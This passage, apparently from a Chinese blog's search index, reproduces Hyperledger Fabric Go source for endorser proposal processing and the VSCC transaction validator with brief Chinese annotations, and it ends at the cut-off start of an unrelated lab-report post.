ledger.DeployedChaincodeInfoProvider } //go:generate counterfeiter -o fake/channel_fetcher.go --fake-name ChannelFetcher . ChannelFetcher  // ChannelFetcher fetches the channel context for a given channel ID. type ChannelFetcher interface { Channel(channelID string) *Channel } type Channel struct { IdentityDeserializer msp.IdentityDeserializer } // Endorser provides the Endorser service ProcessProposal type Endorser struct { ChannelFetcher ChannelFetcher LocalMSP msp.IdentityDeserializer PrivateDataDistributor PrivateDataDistributor Support Support PvtRWSetAssembler PvtRWSetAssembler Metrics *Metrics } // call specified chaincode (system or user) func (e *Endorser) callChaincode(txParams *ccprovider.TransactionParams, input *pb.ChaincodeInput, chaincodeName string) (*pb.Response, *pb.ChaincodeEvent, error) { defer func(start time.Time) { logger := endorserLogger.WithOptions(zap.AddCallerSkip(1)) logger = decorateLogger(logger, txParams) elapsedMillisec := time.Since(start).Milliseconds() logger.Infof(\u0026#34;finished chaincode: %s duration: %dms\u0026#34;, chaincodeName, elapsedMillisec) }(time.Now()) meterLabels := []string{ \u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;chaincode\u0026#34;, chaincodeName, } res, ccevent, err := e.Support.Execute(txParams, chaincodeName, input) if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, err } // per doc anything \u0026lt; 400 can be sent as TX. \t// fabric errors will always be \u0026gt;= 400 (ie, unambiguous errors ) \t// \u0026#34;lscc\u0026#34; will respond with status 200 or 500 (ie, unambiguous OK or ERROR) \tif res.Status \u0026gt;= shim.ERRORTHRESHOLD { return res, nil, nil } // Unless this is the weirdo LSCC case, just return \tif chaincodeName != \u0026#34;lscc\u0026#34; || len(input.Args) \u0026lt; 3 || (string(input.Args[0]) != \u0026#34;deploy\u0026#34; \u0026amp;\u0026amp; string(input.Args[0]) != \u0026#34;upgrade\u0026#34;) { return res, ccevent, nil } // ----- BEGIN - SECTION THAT MAY NEED TO BE DONE IN LSCC ------ \t// if this a call to deploy a chaincode, We need a mechanism \t// to pass TxSimulator into LSCC. Till that is worked out this \t// special code does the actual deploy, upgrade here so as to collect \t// all state under one TxSimulator \t// \t// NOTE that if there\u0026#39;s an error all simulation, including the chaincode \t// table changes in lscc will be thrown away \tcds, err := protoutil.UnmarshalChaincodeDeploymentSpec(input.Args[2]) if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, err } // this should not be a system chaincode \tif e.Support.IsSysCC(cds.ChaincodeSpec.ChaincodeId.Name) { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, errors.Errorf(\u0026#34;attempting to deploy a system chaincode %s/%s\u0026#34;, cds.ChaincodeSpec.ChaincodeId.Name, txParams.ChannelID) } if len(cds.CodePackage) != 0 { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, errors.Errorf(\u0026#34;lscc upgrade/deploy should not include a code packages\u0026#34;) } _, _, err = e.Support.ExecuteLegacyInit(txParams, cds.ChaincodeSpec.ChaincodeId.Name, cds.ChaincodeSpec.ChaincodeId.Version, cds.ChaincodeSpec.Input) if err != nil { // increment the failure to indicate instantion/upgrade failures \tmeterLabels = []string{ \u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;chaincode\u0026#34;, cds.ChaincodeSpec.ChaincodeId.Name, } e.Metrics.InitFailed.With(meterLabels...).Add(1) return nil, nil, err } return res, ccevent, err } // SimulateProposal simulates the proposal by calling the chaincode func (e *Endorser) SimulateProposal(txParams *ccprovider.TransactionParams, chaincodeName string, chaincodeInput *pb.ChaincodeInput) (*pb.Response, []byte, *pb.ChaincodeEvent, error) { logger := decorateLogger(endorserLogger, txParams) meterLabels := []string{ \u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;chaincode\u0026#34;, chaincodeName, } // ---3. execute the proposal and get simulation results \tres, ccevent, err := e.callChaincode(txParams, chaincodeInput, chaincodeName) if err != nil { logger.Errorf(\u0026#34;failed to invoke chaincode %s, error: %+v\u0026#34;, chaincodeName, err) return nil, nil, nil, err } if txParams.TXSimulator == nil { return res, nil, ccevent, nil } // Note, this is a little goofy, as if there is private data, Done() gets called \t// early, so this is invoked multiple times, but that is how the code worked before \t// this change, so, should be safe. Long term, let\u0026#39;s move the Done up to the create. \tdefer txParams.TXSimulator.Done() simResult, err := txParams.TXSimulator.GetTxSimulationResults() if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, err } if simResult.PvtSimulationResults != nil { if chaincodeName == \u0026#34;lscc\u0026#34; { // TODO: remove once we can store collection configuration outside of LSCC \te.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, errors.New(\u0026#34;Private data is forbidden to be used in instantiate\u0026#34;) } pvtDataWithConfig, err := AssemblePvtRWSet(txParams.ChannelID, simResult.PvtSimulationResults, txParams.TXSimulator, e.Support.GetDeployedCCInfoProvider()) // To read collection config need to read collection updates before \t// releasing the lock, hence txParams.TXSimulator.Done() moved down here \ttxParams.TXSimulator.Done() if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, errors.WithMessage(err, \u0026#34;failed to obtain collections config\u0026#34;) } endorsedAt, err := e.Support.GetLedgerHeight(txParams.ChannelID) if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, errors.WithMessage(err, fmt.Sprintf(\u0026#34;failed to obtain ledger height for channel \u0026#39;%s\u0026#39;\u0026#34;, txParams.ChannelID)) } // Add ledger height at which transaction was endorsed, \t// `endorsedAt` is obtained from the block storage and at times this could be \u0026#39;endorsement Height + 1\u0026#39;. \t// However, since we use this height only to select the configuration (3rd parameter in distributePrivateData) and \t// manage transient store purge for orphaned private writesets (4th parameter in distributePrivateData), this works for now. \t// Ideally, ledger should add support in the simulator as a first class function `GetHeight()`. \tpvtDataWithConfig.EndorsedAt = endorsedAt if err := e.PrivateDataDistributor.DistributePrivateData(txParams.ChannelID, txParams.TxID, pvtDataWithConfig, endorsedAt); err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, err } } pubSimResBytes, err := simResult.GetPubSimulationBytes() if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, err } return res, pubSimResBytes, ccevent, nil } // preProcess checks the tx proposal headers, uniqueness and ACL func (e *Endorser) preProcess(up *UnpackedProposal, channel *Channel) error { // at first, we check whether the message is valid  err := up.Validate(channel.IdentityDeserializer) if err != nil { e.Metrics.ProposalValidationFailed.Add(1) return errors.WithMessage(err, \u0026#34;error validating proposal\u0026#34;) } if up.ChannelHeader.ChannelId == \u0026#34;\u0026#34; { // chainless proposals do not/cannot affect ledger and cannot be submitted as transactions \t// ignore uniqueness checks; also, chainless proposals are not validated using the policies \t// of the chain since by definition there is no chain; they are validated against the local \t// MSP of the peer instead by the call to ValidateUnpackProposal above \treturn nil } // labels that provide context for failure metrics \tmeterLabels := []string{ \u0026#34;channel\u0026#34;, up.ChannelHeader.ChannelId, \u0026#34;chaincode\u0026#34;, up.ChaincodeName, } // Here we handle uniqueness check and ACLs for proposals targeting a chain \t// Notice that ValidateProposalMessage has already verified that TxID is computed properly \tif _, err = e.Support.GetTransactionByID(up.ChannelHeader.ChannelId, up.ChannelHeader.TxId); err == nil { // increment failure due to duplicate transactions. Useful for catching replay attacks in \t// addition to benign retries \te.Metrics.DuplicateTxsFailure.With(meterLabels...).Add(1) return errors.Errorf(\u0026#34;duplicate transaction found [%s]. Creator [%x]\u0026#34;, up.ChannelHeader.TxId, up.SignatureHeader.Creator) } // check ACL only for application chaincodes; ACLs \t// for system chaincodes are checked elsewhere \tif !e.Support.IsSysCC(up.ChaincodeName) { // check that the proposal complies with the Channel\u0026#39;s writers \tif err = e.Support.CheckACL(up.ChannelHeader.ChannelId, up.SignedProposal); err != nil { e.Metrics.ProposalACLCheckFailed.With(meterLabels...).Add(1) return err } } return nil } // ProcessProposal process the Proposal func (e *Endorser) ProcessProposal(ctx context.Context, signedProp *pb.SignedProposal) (*pb.ProposalResponse, error) { // start time for computing elapsed time metric for successfully endorsed proposals \tstartTime := time.Now() e.Metrics.ProposalsReceived.Add(1) addr := util.ExtractRemoteAddress(ctx) endorserLogger.Debug(\u0026#34;request from\u0026#34;, addr) // variables to capture proposal duration metric \tsuccess := false up, err := UnpackProposal(signedProp) if err != nil { e.Metrics.ProposalValidationFailed.Add(1) return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: err.Error()}}, err } var channel *Channel if up.ChannelID() != \u0026#34;\u0026#34; { channel = e.ChannelFetcher.Channel(up.ChannelID()) if channel == nil { return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: fmt.Sprintf(\u0026#34;channel \u0026#39;%s\u0026#39; not found\u0026#34;, up.ChannelHeader.ChannelId)}}, nil } } else { channel = \u0026amp;Channel{ IdentityDeserializer: e.LocalMSP, } } // 0 -- check and validate \terr = e.preProcess(up, channel) if err != nil { return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: err.Error()}}, err } defer func() { meterLabels := []string{ \u0026#34;channel\u0026#34;, up.ChannelHeader.ChannelId, \u0026#34;chaincode\u0026#34;, up.ChaincodeName, \u0026#34;success\u0026#34;, strconv.FormatBool(success), } e.Metrics.ProposalDuration.With(meterLabels...).Observe(time.Since(startTime).Seconds()) }() pResp, err := e.ProcessProposalSuccessfullyOrError(up) if err != nil { return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: err.Error()}}, nil } if pResp.Endorsement != nil || up.ChannelHeader.ChannelId == \u0026#34;\u0026#34; { // We mark the tx as successfull only if it was successfully endorsed, or \t// if it was a system chaincode on a channel-less channel and therefore \t// cannot be endorsed. \tsuccess = true // total failed proposals = ProposalsReceived-SuccessfulProposals \te.Metrics.SuccessfulProposals.Add(1) } return pResp, nil } func (e *Endorser) ProcessProposalSuccessfullyOrError(up *UnpackedProposal) (*pb.ProposalResponse, error) { txParams := \u0026amp;ccprovider.TransactionParams{ ChannelID: up.ChannelHeader.ChannelId, TxID: up.ChannelHeader.TxId, SignedProp: up.SignedProposal, Proposal: up.Proposal, } logger := decorateLogger(endorserLogger, txParams) if acquireTxSimulator(up.ChannelHeader.ChannelId, up.ChaincodeName) { txSim, err := e.Support.GetTxSimulator(up.ChannelID(), up.TxID()) if err != nil { return nil, err } // txsim acquires a shared lock on the stateDB. As this would impact the block commits (i.e., commit \t// of valid write-sets to the stateDB), we must release the lock as early as possible. \t// Hence, this txsim object is closed in simulateProposal() as soon as the tx is simulated and \t// rwset is collected before gossip dissemination if required for privateData. For safety, we \t// add the following defer statement and is useful when an error occur. Note that calling \t// txsim.Done() more than once does not cause any issue. If the txsim is already \t// released, the following txsim.Done() simply returns. \tdefer txSim.Done() hqe, err := e.Support.GetHistoryQueryExecutor(up.ChannelID()) if err != nil { return nil, err } txParams.TXSimulator = txSim txParams.HistoryQueryExecutor = hqe } cdLedger, err := e.Support.ChaincodeEndorsementInfo(up.ChannelID(), up.ChaincodeName, txParams.TXSimulator) if err != nil { return nil, errors.WithMessagef(err, \u0026#34;make sure the chaincode %s has been successfully defined on channel %s and try again\u0026#34;, up.ChaincodeName, up.ChannelID()) } // 1 -- simulate \tres, simulationResult, ccevent, err := e.SimulateProposal(txParams, up.ChaincodeName, up.Input) if err != nil { return nil, errors.WithMessage(err, \u0026#34;error in simulation\u0026#34;) } cceventBytes, err := CreateCCEventBytes(ccevent) if err != nil { return nil, errors.Wrap(err, \u0026#34;failed to marshal chaincode event\u0026#34;) } prpBytes, err := protoutil.GetBytesProposalResponsePayload(up.ProposalHash, res, simulationResult, cceventBytes, \u0026amp;pb.ChaincodeID{ Name: up.ChaincodeName, Version: cdLedger.Version, }) if err != nil { logger.Warning(\u0026#34;Failed marshaling the proposal response payload to bytes\u0026#34;, err) return nil, errors.WithMessage(err, \u0026#34;failed to create the proposal response\u0026#34;) } // if error, capture endorsement failure metric \tmeterLabels := []string{ \u0026#34;channel\u0026#34;, up.ChannelID(), \u0026#34;chaincode\u0026#34;, up.ChaincodeName, } switch { case res.Status \u0026gt;= shim.ERROR: return \u0026amp;pb.ProposalResponse{ Response: res, Payload: prpBytes, }, nil case up.ChannelID() == \u0026#34;\u0026#34;: // Chaincode invocations without a channel ID is a broken concept \t// that should be removed in the future. For now, return unendorsed \t// success. \treturn \u0026amp;pb.ProposalResponse{ Response: res, }, nil case res.Status \u0026gt;= shim.ERRORTHRESHOLD: meterLabels = append(meterLabels, \u0026#34;chaincodeerror\u0026#34;, strconv.FormatBool(true)) e.Metrics.EndorsementsFailed.With(meterLabels...).Add(1) logger.Debugf(\u0026#34;chaincode error %d\u0026#34;, res.Status) return \u0026amp;pb.ProposalResponse{ Response: res, }, nil } escc := cdLedger.EndorsementPlugin logger.Debugf(\u0026#34;escc for chaincode %s is %s\u0026#34;, up.ChaincodeName, escc) // Note, mPrpBytes is the same as prpBytes by default endorsement plugin, but others could change it. \tendorsement, mPrpBytes, err := e.Support.EndorseWithPlugin(escc, up.ChannelID(), prpBytes, up.SignedProposal) if err != nil { meterLabels = append(meterLabels, \u0026#34;chaincodeerror\u0026#34;, strconv.FormatBool(false)) e.Metrics.EndorsementsFailed.With(meterLabels...).Add(1) return nil, errors.WithMessage(err, \u0026#34;endorsing with plugin failed\u0026#34;) } return \u0026amp;pb.ProposalResponse{ Version: 1, Endorsement: endorsement, Payload: mPrpBytes, Response: res, }, nil } // determine whether or not a transaction simulator should be // obtained for a proposal. func acquireTxSimulator(chainID string, chaincodeName string) bool { if chainID == \u0026#34;\u0026#34; { return false } // ¯\\_(ツ)_/¯ locking. \t// Don\u0026#39;t get a simulator for the query and config system chaincode. \t// These don\u0026#39;t need the simulator and its read lock results in deadlocks. \tswitch chaincodeName { case \u0026#34;qscc\u0026#34;, \u0026#34;cscc\u0026#34;: return false default: return true } } // shorttxid replicates the chaincode package function to shorten txids. // ~~TODO utilize a common shorttxid utility across packages.~~ // TODO use a formal type for transaction ID and make it a stringer func shorttxid(txid string) string { if len(txid) \u0026lt; 8 { return txid } return txid[0:8] } func CreateCCEventBytes(ccevent *pb.ChaincodeEvent) ([]byte, error) { if ccevent == nil { return nil, nil } return proto.Marshal(ccevent) } func decorateLogger(logger *flogging.FabricLogger, txParams *ccprovider.TransactionParams) *flogging.FabricLogger { return logger.With(\u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;txID\u0026#34;, shorttxid(txParams.TxID)) } 验证系统链码 (Validator System Chaincode, VSCC)  /core/committer/txvalidator/v14/vscc_validator.go\n 被记账节点(validator)调用，根据合约的背书政策验证交易的有效性和背书的正确性。\npackage txvalidator import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/golang/protobuf/proto\u0026#34; \u0026#34;github.com/hyperledger/fabric-protos-go/common\u0026#34; \u0026#34;github.com/hyperledger/fabric-protos-go/peer\u0026#34; commonerrors \u0026#34;github.com/hyperledger/fabric/common/errors\u0026#34; \u0026#34;github.com/hyperledger/fabric/common/policydsl\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/common/ccprovider\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/common/sysccprovider\u0026#34; validation \u0026#34;github.com/hyperledger/fabric/core/handlers/validation/api\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/rwsetutil\u0026#34; \u0026#34;github.com/hyperledger/fabric/protoutil\u0026#34; \u0026#34;github.com/pkg/errors\u0026#34; ) // VsccValidatorImpl is the implementation used to call // the vscc chaincode and validate block transactions type VsccValidatorImpl struct { channelID string cr ChannelResources pluginValidator *PluginValidator } // 用于调用vscc链码并验证区块事务  // newVSCCValidator creates new vscc validator func newVSCCValidator(channelID string, cr ChannelResources, pluginValidator *PluginValidator) *VsccValidatorImpl { return \u0026amp;VsccValidatorImpl{ channelID: channelID, cr: cr, pluginValidator: pluginValidator, } } func getChaincodeHeaderExtension(hdr *common.Header) (*peer.ChaincodeHeaderExtension, error) { chdr, err := protoutil.UnmarshalChannelHeader(hdr.ChannelHeader) if err != nil { return nil, err } chaincodeHdrExt := \u0026amp;peer.ChaincodeHeaderExtension{} err = proto.Unmarshal(chdr.Extension, chaincodeHdrExt) return chaincodeHdrExt, errors.Wrap(err, \u0026#34;error unmarshaling ChaincodeHeaderExtension\u0026#34;) } // VSCCValidateTx executes vscc validation for transaction func (v *VsccValidatorImpl) VSCCValidateTx(seq int, payload *common.Payload, envBytes []byte, block *common.Block) (error, peer.TxValidationCode) { chainID := v.channelID logger.Debugf(\u0026#34;[%s] VSCCValidateTx starts for bytes %p\u0026#34;, chainID, envBytes) // get header extensions so we have the chaincode ID \thdrExt, err := getChaincodeHeaderExtension(payload.Header) if err != nil { return err, peer.TxValidationCode_BAD_HEADER_EXTENSION } // get channel header \tchdr, err := protoutil.UnmarshalChannelHeader(payload.Header.ChannelHeader) if err != nil { return err, peer.TxValidationCode_BAD_CHANNEL_HEADER } /* obtain the list of namespaces we\u0026#39;re writing stuff to; at first, we establish a few facts about this invocation: 1) which namespaces does it write to? 2) does it write to LSCC\u0026#39;s namespace? 3) does it write to any cc that cannot be invoked? */ writesToLSCC := false writesToNonInvokableSCC := false respPayload, err := protoutil.GetActionFromEnvelope(envBytes) if err != nil { return errors.WithMessage(err, \u0026#34;GetActionFromEnvelope failed\u0026#34;), peer.TxValidationCode_BAD_RESPONSE_PAYLOAD } txRWSet := \u0026amp;rwsetutil.TxRwSet{} if err = txRWSet.FromProtoBytes(respPayload.Results); err != nil { return errors.WithMessage(err, \u0026#34;txRWSet.FromProtoBytes failed\u0026#34;), peer.TxValidationCode_BAD_RWSET } // Verify the header extension and response payload contain the ChaincodeId \tif hdrExt.ChaincodeId == nil { return errors.New(\u0026#34;nil ChaincodeId in header extension\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } if respPayload.ChaincodeId == nil { return errors.New(\u0026#34;nil ChaincodeId in ChaincodeAction\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } // get name and version of the cc we invoked \tccID := hdrExt.ChaincodeId.Name ccVer := respPayload.ChaincodeId.Version // sanity check on ccID \tif ccID == \u0026#34;\u0026#34; { err = errors.New(\u0026#34;invalid chaincode ID\u0026#34;) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } if ccID != respPayload.ChaincodeId.Name { err = errors.Errorf(\u0026#34;inconsistent ccid info (%s/%s)\u0026#34;, ccID, respPayload.ChaincodeId.Name) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } // sanity check on ccver \tif ccVer == \u0026#34;\u0026#34; { err = errors.New(\u0026#34;invalid chaincode version\u0026#34;) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } var wrNamespace []string alwaysEnforceOriginalNamespace := v.cr.Capabilities().V1_2Validation() if alwaysEnforceOriginalNamespace { wrNamespace = append(wrNamespace, ccID) if respPayload.Events != nil { ccEvent := \u0026amp;peer.ChaincodeEvent{} if err = proto.Unmarshal(respPayload.Events, ccEvent); err != nil { return errors.Wrapf(err, \u0026#34;invalid chaincode event\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } if ccEvent.ChaincodeId != ccID { return errors.Errorf(\u0026#34;chaincode event chaincode id does not match chaincode action chaincode id\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } } } namespaces := make(map[string]struct{}) for _, ns := range txRWSet.NsRwSets { // check to make sure there is no duplicate namespace in txRWSet \tif _, ok := namespaces[ns.NameSpace]; ok { return errors.Errorf(\u0026#34;duplicate namespace \u0026#39;%s\u0026#39; in txRWSet\u0026#34;, ns.NameSpace), peer.TxValidationCode_ILLEGAL_WRITESET } namespaces[ns.NameSpace] = struct{}{} if !v.txWritesToNamespace(ns) { continue } // Check to make sure we did not already populate this chaincode \t// name to avoid checking the same namespace twice \tif ns.NameSpace != ccID || !alwaysEnforceOriginalNamespace { wrNamespace = append(wrNamespace, ns.NameSpace) } if !writesToLSCC \u0026amp;\u0026amp; ns.NameSpace == \u0026#34;lscc\u0026#34; { writesToLSCC = true } if !writesToNonInvokableSCC \u0026amp;\u0026amp; IsSysCCAndNotInvokableCC2CC(ns.NameSpace) { writesToNonInvokableSCC = true } if !writesToNonInvokableSCC \u0026amp;\u0026amp; IsSysCCAndNotInvokableExternal(ns.NameSpace) { writesToNonInvokableSCC = true } } // we\u0026#39;ve gathered all the info required to proceed to validation; \t// validation will behave differently depending on the type of \t// chaincode (system vs. application)  if !IsSysCC(ccID) { // if we\u0026#39;re here, we know this is an invocation of an application chaincode; \t// first of all, we make sure that: \t// 1) we don\u0026#39;t write to LSCC - an application chaincode is free to invoke LSCC \t// for instance to get information about itself or another chaincode; however \t// these legitimate invocations only ready from LSCC\u0026#39;s namespace; currently \t// only two functions of LSCC write to its namespace: deploy and upgrade and \t// neither should be used by an application chaincode \tif writesToLSCC { return errors.Errorf(\u0026#34;chaincode %s attempted to write to the namespace of LSCC\u0026#34;, ccID), peer.TxValidationCode_ILLEGAL_WRITESET } // 2) we don\u0026#39;t write to the namespace of a chaincode that we cannot invoke - if \t// the chaincode cannot be invoked in the first place, there\u0026#39;s no legitimate \t// way in which a transaction has a write set that writes to it; additionally \t// we don\u0026#39;t have any means of verifying whether the transaction had the rights \t// to perform that write operation because in v1, system chaincodes do not have \t// any endorsement policies to speak of. So if the chaincode can\u0026#39;t be invoked \t// it can\u0026#39;t be written to by an invocation of an application chaincode \tif writesToNonInvokableSCC { return errors.Errorf(\u0026#34;chaincode %s attempted to write to the namespace of a system chaincode that cannot be invoked\u0026#34;, ccID), peer.TxValidationCode_ILLEGAL_WRITESET } // validate *EACH* read write set according to its chaincode\u0026#39;s endorsement policy \tfor _, ns := range wrNamespace { // Get latest chaincode version, vscc and validate policy \ttxcc, vscc, policy, err := v.GetInfoForValidate(chdr, ns) if err != nil { logger.Errorf(\u0026#34;GetInfoForValidate for txId = %s returned error: %+v\u0026#34;, chdr.TxId, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } // if the namespace corresponds to the cc that was originally \t// invoked, we check that the version of the cc that was \t// invoked corresponds to the version that lscc has returned \tif ns == ccID \u0026amp;\u0026amp; txcc.ChaincodeVersion != ccVer { err = errors.Errorf(\u0026#34;chaincode %s:%s/%s didn\u0026#39;t match %s:%s/%s in lscc\u0026#34;, ccID, ccVer, chdr.ChannelId, txcc.ChaincodeName, txcc.ChaincodeVersion, chdr.ChannelId) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_EXPIRED_CHAINCODE } // do VSCC validation \tctx := \u0026amp;Context{ Seq: seq, Envelope: envBytes, Block: block, TxID: chdr.TxId, Channel: chdr.ChannelId, Namespace: ns, Policy: policy, VSCCName: vscc.ChaincodeName, } if err = v.VSCCValidateTxForCC(ctx); err != nil { switch err.(type) { case *commonerrors.VSCCEndorsementPolicyError: return err, peer.TxValidationCode_ENDORSEMENT_POLICY_FAILURE default: return err, peer.TxValidationCode_INVALID_OTHER_REASON } } } } else { // make sure that we can invoke this system chaincode - if the chaincode \t// cannot be invoked through a proposal to this peer, we have to drop the \t// transaction; if we didn\u0026#39;t, we wouldn\u0026#39;t know how to decide whether it\u0026#39;s \t// valid or not because in v1, system chaincodes have no endorsement policy \tif IsSysCCAndNotInvokableExternal(ccID) { return errors.Errorf(\u0026#34;committing an invocation of cc %s is illegal\u0026#34;, ccID), peer.TxValidationCode_ILLEGAL_WRITESET } // Get latest chaincode version, vscc and validate policy \t_, vscc, policy, err := v.GetInfoForValidate(chdr, ccID) if err != nil { logger.Errorf(\u0026#34;GetInfoForValidate for txId = %s returned error: %+v\u0026#34;, chdr.TxId, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } // validate the transaction as an invocation of this system chaincode; \t// vscc will have to do custom validation for this system chaincode \t// currently, VSCC does custom validation for LSCC only; if an hlf \t// user creates a new system chaincode which is invokable from the outside \t// they have to modify VSCC to provide appropriate validation \tctx := \u0026amp;Context{ Seq: seq, Envelope: envBytes, Block: block, TxID: chdr.TxId, Channel: chdr.ChannelId, Namespace: ccID, Policy: policy, VSCCName: vscc.ChaincodeName, } if err = v.VSCCValidateTxForCC(ctx); err != nil { switch err.(type) { case *commonerrors.VSCCEndorsementPolicyError: return err, peer.TxValidationCode_ENDORSEMENT_POLICY_FAILURE default: return err, peer.TxValidationCode_INVALID_OTHER_REASON } } } logger.Debugf(\u0026#34;[%s] VSCCValidateTx completes env bytes %p\u0026#34;, chainID, envBytes) return nil, peer.TxValidationCode_VALID } func (v *VsccValidatorImpl) VSCCValidateTxForCC(ctx *Context) error { logger.Debug(\u0026#34;Validating\u0026#34;, ctx, \u0026#34;with plugin\u0026#34;) err := v.pluginValidator.ValidateWithPlugin(ctx) if err == nil { return nil } // If the error is a pluggable validation execution error, cast it to the common errors ExecutionFailureError. \tif e, isExecutionError := err.(*validation.ExecutionFailureError); isExecutionError { return \u0026amp;commonerrors.VSCCExecutionFailureError{Err: e} } // Else, treat it as an endorsement error. \treturn \u0026amp;commonerrors.VSCCEndorsementPolicyError{Err: err} } func (v *VsccValidatorImpl) getCDataForCC(chid, ccid string) (*ccprovider.ChaincodeData, error) { l := v.cr.Ledger() if l == nil { return nil, errors.New(\u0026#34;nil ledger instance\u0026#34;) } qe, err := l.NewQueryExecutor() if err != nil { return nil, errors.WithMessage(err, \u0026#34;could not retrieve QueryExecutor\u0026#34;) } defer qe.Done() bytes, err := qe.GetState(\u0026#34;lscc\u0026#34;, ccid) if err != nil { return nil, \u0026amp;commonerrors.VSCCInfoLookupFailureError{ Reason: fmt.Sprintf(\u0026#34;Could not retrieve state for chaincode %s, error %s\u0026#34;, ccid, err), } } if bytes == nil { return nil, errors.Errorf(\u0026#34;lscc\u0026#39;s state for [%s] not found.\u0026#34;, ccid) } cd := \u0026amp;ccprovider.ChaincodeData{} err = proto.Unmarshal(bytes, cd) if err != nil { return nil, errors.Wrap(err, \u0026#34;unmarshalling ChaincodeQueryResponse failed\u0026#34;) } if cd.Vscc == \u0026#34;\u0026#34; { return nil, errors.Errorf(\u0026#34;lscc\u0026#39;s state for [%s] is invalid, vscc field must be set\u0026#34;, ccid) } if len(cd.Policy) == 0 { return nil, errors.Errorf(\u0026#34;lscc\u0026#39;s state for [%s] is invalid, policy field must be set\u0026#34;, ccid) } return cd, err } // GetInfoForValidate gets the ChaincodeInstance(with latest version) of tx, vscc and policy from lscc func (v *VsccValidatorImpl) GetInfoForValidate(chdr *common.ChannelHeader, ccID string) (*sysccprovider.ChaincodeInstance, *sysccprovider.ChaincodeInstance, []byte, error) { cc := \u0026amp;sysccprovider.ChaincodeInstance{ ChannelID: chdr.ChannelId, ChaincodeName: ccID, } vscc := \u0026amp;sysccprovider.ChaincodeInstance{ ChannelID: chdr.ChannelId, ChaincodeName: \u0026#34;vscc\u0026#34;, // default vscc for system chaincodes \t} var policy []byte var err error if !IsSysCC(ccID) { // when we are validating a chaincode that is not a \t// system CC, we need to ask the CC to give us the name \t// of VSCC and of the policy that should be used  // obtain name of the VSCC and the policy \tcd, err := v.getCDataForCC(chdr.ChannelId, ccID) if err != nil { msg := fmt.Sprintf(\u0026#34;Unable to get chaincode data from ledger for txid %s, due to %s\u0026#34;, chdr.TxId, err) logger.Errorf(msg) return nil, nil, nil, err } cc.ChaincodeName = cd.Name cc.ChaincodeVersion = cd.Version vscc.ChaincodeName, policy = cd.Vscc, cd.Policy } else { // when we are validating a system CC, we use the default \t// VSCC and a default policy that requires one signature \t// from any of the members of the channel \tp := policydsl.SignedByAnyMember(v.cr.GetMSPIDs()) policy, err = protoutil.Marshal(p) if err != nil { return nil, nil, nil, err } } return cc, vscc, policy, nil } // txWritesToNamespace returns true if the supplied NsRwSet // performs a ledger write func (v *VsccValidatorImpl) txWritesToNamespace(ns *rwsetutil.NsRwSet) bool { // check for public writes first \tif ns.KvRwSet != nil \u0026amp;\u0026amp; len(ns.KvRwSet.Writes) \u0026gt; 0 { return true } // only look at collection data if we support that capability \tif v.cr.Capabilities().PrivateChannelData() { // check for private writes for all collections \tfor _, c := range ns.CollHashedRwSets { if c.HashedRwSet != nil \u0026amp;\u0026amp; len(c.HashedRwSet.HashedWrites) \u0026gt; 0 { return true } // only look at private metadata writes if we support that capability \tif v.cr.Capabilities().KeyLevelEndorsement() { // private metadata updates \tif c.HashedRwSet != nil \u0026amp;\u0026amp; len(c.HashedRwSet.MetadataWrites) \u0026gt; 0 { return true } } } } // only look at metadata writes if we support that capability \tif v.cr.Capabilities().KeyLevelEndorsement() { // public metadata updates \tif ns.KvRwSet != nil \u0026amp;\u0026amp; len(ns.KvRwSet.MetadataWrites) \u0026gt; 0 { return true } } return false } func IsSysCCAndNotInvokableExternal(name string) bool { return name == \u0026#34;vscc\u0026#34; || name == \u0026#34;escc\u0026#34; } func IsSysCC(name string) bool { return name == \u0026#34;vscc\u0026#34; || name == \u0026#34;escc\u0026#34; || name == \u0026#34;lscc\u0026#34; || name == \u0026#34;qscc\u0026#34; || name == \u0026#34;cscc\u0026#34; } func IsSysCCAndNotInvokableCC2CC(name string) bool { return name == \u0026#34;vscc\u0026#34; || name == \u0026#34;escc\u0026#34; || name == \u0026#34;cscc\u0026#34; } ","date":"2020-12-08T01:33:07Z","permalink":"/post/fabric-architecture-and-systemchaincode/","title":"Fabric-Architecture-and-SystemChaincode"},{"content":"分光仪 实验时间：2020年9月21日\n这是我做的第一个实验，成功AK（手动狗头）\n调整 